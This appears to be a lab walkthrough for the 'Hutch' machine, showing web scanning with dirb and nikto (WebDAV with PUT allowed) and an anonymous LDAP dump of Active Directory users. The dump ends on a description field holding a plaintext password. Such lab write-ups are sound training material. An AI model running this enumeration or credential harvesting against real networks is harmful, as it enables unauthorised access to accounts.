# Hutch

# Enumeration

## 80 - Web

```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.234.122/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 26 03:57:25 2022
URL_BASE: http://192.168.234.122/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.234.122/ ----
==> DIRECTORY: http://192.168.234.122/aspnet_client/                                                                                                                   
                                                                                                                                                                       
---- Entering directory: http://192.168.234.122/aspnet_client/ ----
==> DIRECTORY: http://192.168.234.122/aspnet_client/system_web/                                                                                                        
                                                                                                                                                                       
---- Entering directory: http://192.168.234.122/aspnet_client/system_web/ ----
                                                                                                                                                                       
-----------------
END_TIME: Sat Feb 26 04:41:37 2022
DOWNLOADED: 13836 - FOUND: 0

┌──(kali㉿kali)-[~]
└─$ nikto -h 192.168.234.122                      
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.234.122
+ Target Hostname:    192.168.234.122
+ Target Port:        80
+ Start Time:         2022-02-26 11:13:14 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dav header: 1,2,3
+ Retrieved ms-author-via header: DAV
+ Uncommon header 'ms-author-via' found, with contents: DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK 
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (COPY UNLOCK LOCK PROPPATCH MKCOL PROPFIND listed as allowed)
^C    

┌──(kali㉿kali)-[~]
└─$ 
```

## LDAP

```bash
┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -h 192.168.234.122 -D '' -w '' -b "CN=Users,DC=hutch,DC=offsec"                                                                                  10 ⨯
# extended LDIF
#
# LDAPv3
# base <CN=Users,DC=hutch,DC=offsec> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# krbtgt, Users, hutch.offsec
dn: CN=krbtgt,CN=Users,DC=hutch,DC=offsec

# Domain Computers, Users, hutch.offsec
dn: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Domain Computers
description: All workstations and servers joined to the domain
distinguishedName: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12330
uSNChanged: 12332
name: Domain Computers
objectGUID:: SuBXv87h/Uq0hS9itdhc7g==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAwIAAA==
sAMAccountName: Domain Computers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Controllers, Users, hutch.offsec
dn: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec

# Schema Admins, Users, hutch.offsec
dn: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec

# Enterprise Admins, Users, hutch.offsec
dn: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec

# Cert Publishers, Users, hutch.offsec
dn: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Cert Publishers
description: Members of this group are permitted to publish certificates to th
 e directory
distinguishedName: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12342
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offse
 c
uSNChanged: 12344
name: Cert Publishers
objectGUID:: 6pR13+h/v0CBSMnRpjymjA==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnBQIAAA==
sAMAccountName: Cert Publishers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Admins, Users, hutch.offsec
dn: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec

# Domain Users, Users, hutch.offsec
dn: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Domain Users
description: All domain users
distinguishedName: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12348
memberOf: CN=Users,CN=Builtin,DC=hutch,DC=offsec
uSNChanged: 12350
name: Domain Users
objectGUID:: 0zyAAvzt1UOKBKbf0N6FQQ==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAQIAAA==
sAMAccountName: Domain Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Guests, Users, hutch.offsec
dn: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Domain Guests
description: All domain guests
distinguishedName: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12351
memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
uSNChanged: 12353
name: Domain Guests
objectGUID:: 8IN1upAPCUqFJVGtzCE2ew==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAgIAAA==
sAMAccountName: Domain Guests
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Group Policy Creator Owners, Users, hutch.offsec
dn: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Group Policy Creator Owners
description: Members in this group can modify group policy for the domain
member: CN=Administrator,CN=Users,DC=hutch,DC=offsec
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12354
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offse
 c
uSNChanged: 12391
name: Group Policy Creator Owners
objectGUID:: CC/2IAwkpk+RkSicEUmVCA==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnCAIAAA==
sAMAccountName: Group Policy Creator Owners
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# RAS and IAS Servers, Users, hutch.offsec
dn: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: RAS and IAS Servers
description: Servers in this group can access remote access properties of user
 s
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12357
uSNChanged: 12359
name: RAS and IAS Servers
objectGUID:: jwjGdt4Qfk2M0XMn8FMiVg==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnKQIAAA==
sAMAccountName: RAS and IAS Servers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Allowed RODC Password Replication Group, Users, hutch.offsec
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Allowed RODC Password Replication Group
description: Members in this group can have their passwords replicated to all 
 read-only domain controllers in the domain
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutc
 h,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12402
uSNChanged: 12404
name: Allowed RODC Password Replication Group
objectGUID:: 5ErycQkHo02pMg1/xxJNIQ==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnOwIAAA==
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Denied RODC Password Replication Group, Users, hutch.offsec
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Denied RODC Password Replication Group
description: Members in this group cannot have their passwords replicated to a
 ny read-only domain controllers in the domain
member: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
member: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
member: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec
member: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
member: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec
member: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec
member: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec
member: CN=krbtgt,CN=Users,DC=hutch,DC=offsec
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch
 ,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12405
uSNChanged: 12433
name: Denied RODC Password Replication Group
objectGUID:: I0YqHi+34U+yrPKy8jL7YA==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnPAIAAA==
sAMAccountName: Denied RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Read-only Domain Controllers, Users, hutch.offsec
dn: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec

# Enterprise Read-only Domain Controllers, Users, hutch.offsec
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Enterprise Read-only Domain Controllers
description: Members of this group are Read-Only Domain Controllers in the ent
 erprise
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutc
 h,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12429
uSNChanged: 12431
name: Enterprise Read-only Domain Controllers
objectGUID:: xkuEQsOH+UekvpicNYDyqw==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGn8gEAAA==
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Cloneable Domain Controllers, Users, hutch.offsec
dn: CN=Cloneable Domain Controllers,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Cloneable Domain Controllers
description: Members of this group that are domain controllers may be cloned.
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12440
uSNChanged: 12442
name: Cloneable Domain Controllers
objectGUID:: IOOLFwbLHU+szn+H1kGShg==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnCgIAAA==
sAMAccountName: Cloneable Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Protected Users, Users, hutch.offsec
dn: CN=Protected Users,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Protected Users
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
distinguishedName: CN=Protected Users,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12445
uSNChanged: 12447
name: Protected Users
objectGUID:: mA4Fn/4sO0q/fsDXx5HOhg==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnDQIAAA==
sAMAccountName: Protected Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Key Admins, Users, hutch.offsec
dn: CN=Key Admins,CN=Users,DC=hutch,DC=offsec

# Enterprise Key Admins, Users, hutch.offsec
dn: CN=Enterprise Key Admins,CN=Users,DC=hutch,DC=offsec

# DnsAdmins, Users, hutch.offsec
dn: CN=DnsAdmins,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: DnsAdmins
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052702.0Z
whenChanged: 20201104052702.0Z
uSNCreated: 12486
uSNChanged: 12488
name: DnsAdmins
objectGUID:: oohK2PE1PUydvjjBS/KBzw==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTQQAAA==
sAMAccountName: DnsAdmins
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# DnsUpdateProxy, Users, hutch.offsec
dn: CN=DnsUpdateProxy,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: DnsUpdateProxy
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052702.0Z
whenChanged: 20201104052702.0Z
uSNCreated: 12491
uSNChanged: 12491
name: DnsUpdateProxy
objectGUID:: QVU11mCC40GAeAjr+EUd7w==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTgQAAA==
sAMAccountName: DnsUpdateProxy
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Rosaline Placidi, Users, hutch.offsec
dn: CN=Rosaline Placidi,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Rosaline Placidi
distinguishedName: CN=Rosaline Placidi,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12759
uSNChanged: 12763
name: Rosaline Placidi
objectGUID:: ZnXcaol0h0O06eCHssgsaw==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417051062737
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: rplacidi
sAMAccountType: 805306368
userPrincipalName: rplacidi@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Otto Patry, Users, hutch.offsec
dn: CN=Otto Patry,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Otto Patry
distinguishedName: CN=Otto Patry,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12765
uSNChanged: 12769
name: Otto Patry
objectGUID:: Z/B36x+G7EKQOh7bdq2Gdg==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417052162728
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: opatry
sAMAccountType: 805306368
userPrincipalName: opatry@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Lyndsie Taunton, Users, hutch.offsec
dn: CN=Lyndsie Taunton,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Lyndsie Taunton
distinguishedName: CN=Lyndsie Taunton,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12771
uSNChanged: 12775
name: Lyndsie Taunton
objectGUID:: osEKgirap0C06Opb/Wc8lQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417052642725
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: ltaunton
sAMAccountType: 805306368
userPrincipalName: ltaunton@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Arlyn Costello, Users, hutch.offsec
dn: CN=Arlyn Costello,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Arlyn Costello
distinguishedName: CN=Arlyn Costello,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12777
uSNChanged: 12781
name: Arlyn Costello
objectGUID:: OdMef64Ah0apX2/LyqiHYA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417053152725
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: acostello
sAMAccountType: 805306368
userPrincipalName: acostello@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Johnnie Sparwell, Users, hutch.offsec
dn: CN=Johnnie Sparwell,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Johnnie Sparwell
distinguishedName: CN=Johnnie Sparwell,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12783
uSNChanged: 12787
name: Johnnie Sparwell
objectGUID:: y1RU3ceaqEyn1XecBNhkVQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417053772722
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: jsparwell
sAMAccountType: 805306368
userPrincipalName: jsparwell@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Ottilie Knee, Users, hutch.offsec
dn: CN=Ottilie Knee,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ottilie Knee
distinguishedName: CN=Ottilie Knee,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12789
uSNChanged: 12793
name: Ottilie Knee
objectGUID:: /bMvDx/e506T4lQ+rB8/FA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417054332736
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: oknee
sAMAccountType: 805306368
userPrincipalName: oknee@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Joan McKendry, Users, hutch.offsec
dn: CN=Joan McKendry,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Joan McKendry
distinguishedName: CN=Joan McKendry,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12795
uSNChanged: 12799
name: Joan McKendry
objectGUID:: awivgHuoDEKrRWtvGV31rQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417054922729
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: jmckendry
sAMAccountType: 805306368
userPrincipalName: jmckendry@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Alexia Victoria, Users, hutch.offsec
dn: CN=Alexia Victoria,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Alexia Victoria
distinguishedName: CN=Alexia Victoria,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12801
uSNChanged: 12805
name: Alexia Victoria
objectGUID:: pYkiH0wnEUGtTvJmed1oTQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417055452791
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: avictoria
sAMAccountType: 805306368
userPrincipalName: avictoria@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Jane Frarey, Users, hutch.offsec
dn: CN=Jane Frarey,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Jane Frarey
distinguishedName: CN=Jane Frarey,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12807
uSNChanged: 12811
name: Jane Frarey
objectGUID:: ixEEnk99f0WcwVSNK+e+oA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417056032732
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: jfrarey
sAMAccountType: 805306368
userPrincipalName: jfrarey@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Editha Aburrow, Users, hutch.offsec
dn: CN=Editha Aburrow,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Editha Aburrow
distinguishedName: CN=Editha Aburrow,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12813
uSNChanged: 12817
name: Editha Aburrow
objectGUID:: +7Byu5JQuU2TfrLSegT8VQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417056522726
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: eaburrow
sAMAccountType: 805306368
userPrincipalName: eaburrow@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Claus Luddy, Users, hutch.offsec
dn: CN=Claus Luddy,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Claus Luddy
distinguishedName: CN=Claus Luddy,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12819
uSNChanged: 12823
name: Claus Luddy
objectGUID:: XXbxCiLxHkKjA7Pd0VTq1A==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417057032735
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: cluddy
sAMAccountType: 805306368
userPrincipalName: cluddy@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Arthur Gitthouse, Users, hutch.offsec
dn: CN=Arthur Gitthouse,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Arthur Gitthouse
distinguishedName: CN=Arthur Gitthouse,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12825
uSNChanged: 12829
name: Arthur Gitthouse
objectGUID:: PQ8QTFNtw0elgPkzWaOmHA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417057602730
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: agitthouse
sAMAccountType: 805306368
userPrincipalName: agitthouse@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
